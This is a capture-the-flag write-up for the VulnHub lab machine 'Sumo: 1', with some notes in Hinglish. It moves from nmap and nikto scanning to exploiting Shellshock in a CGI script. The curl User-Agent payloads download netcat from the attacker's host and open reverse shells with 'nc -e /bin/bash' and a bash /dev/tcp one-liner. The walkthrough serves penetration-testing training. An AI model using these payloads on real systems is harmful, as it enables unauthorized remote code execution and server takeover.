<div class="page">

# Sumo : 1

\

## 

## Sumo : 1

- **<span style="color:#ffbe6f;">Sumo : 1</span>** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/sumo-1,480/>

![](images/8-1.png)

- Now unzip the file .
- Open ovf file .
- Then click finish .
- Start the machine .

<!-- -->

- Find the machine ip :

<div class="codebox">

    nmap -sn 192.168.2.0/24 

</div>

![](images/8-2.png)

- Find the available port :

<div class="codebox">

    nmap -v -p- 192.168.2.147

</div>

![](images/8-3.png)

- Start by scanning the target with nmap to identify open ports and
  services running on the machine : This command performs a basic scan
  on port 80 and attempts service version detection .

<div class="codebox">

    nmap -v -p 80 -sT -sV -A 192.168.2.147

</div>

![](images/8-4.png)

- Use nmap with the http-enum script to gather more detailed information
  on the target web server : This command runs an aggressive scan and
  uses the http-enum script to identify potential CGI directories .

<div class="codebox">

    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.147

</div>

- Scan all common CGI directories : This checks for vulnerabilities
  across the target HTTP service on port 80.

<div class="codebox">

    nikto -C all -h http://192.168.2.147/ 

</div>

- 

<div class="codebox">

    nikto -Cgidirs all -h 192.168.2.147

</div>

- 

<div class="codebox">

    nikto -C all -h 192.168.2.147

</div>

![](images/8-5.png) Isme shellshock ki vulnerability h .

- Once you identify the target and confirm it's vulnerable to
  ShellShock, you can send HTTP requests to trigger the vulnerability
  via the User-Agent header.

<!-- -->

- Now check what is running in this ip : <http://192.168.2.147/>

![](images/8-6.png)

- WGET Command to Download Files :

<div class="codebox">

    nmap -v -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test/test.cgi,cmd="/usr/bin/wget http://192.168.2.219" 192.168.2.147

</div>

![](images/8-7.png) ![](images/8-8.png)

- Reverse Shell Commands :

<!-- -->

- If you gain remote code execution, you can attempt to spawn a reverse
  shell.

<!-- -->

- Reverse Shell via Netcat :

<!-- -->

- nc placed in server : Jis place me nc h us place me python k server
  start krna h phir browser me ip call kr ke copy link address krna h .

<div class="codebox">

    curl -H "User-Agent: () { :; }; /bin/bash -c 'wget http://192.168.2.219/nc64 -O /tmp/nc64'" http://192.168.2.147/cgi-bin/test/test.cgi --proxy http://127.0.0.1:8080

</div>

![](images/8-9.png) ![](images/8-10.png) nc placed.

<div class="codebox">

    curl -H "User-Agent: () { :; }; /bin/bash -c 'chmod 777 /tmp/nc64'" http://192.168.2.147/cgi-bin/test/test.cgi --proxy http://127.0.0.1:8080

</div>

![](images/8-11.png)

<div class="codebox">

    nc -nlvp 443

</div>

<div class="codebox">

    curl -H "User-Agent: () { :; }; /bin/bash -c '/tmp/nc64 -e /bin/bash 192.168.2.219 443'" http://192.168.2.147/cgi-bin/test/test.cgi --proxy http://127.0.0.1:8080

</div>

![](images/8-12.png) ![](images/8-13.png) reverse shell take it .

- Reverse Shell via Bash :

<div class="codebox">

    nc -nlvp 443

</div>

<div class="codebox">

    curl -A '() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/192.168.2.219/443 0>&1' http://192.168.2.147/cgi-bin/test/test.cgi

</div>

![](images/8-14.png) ![](images/8-15.png)

</div>
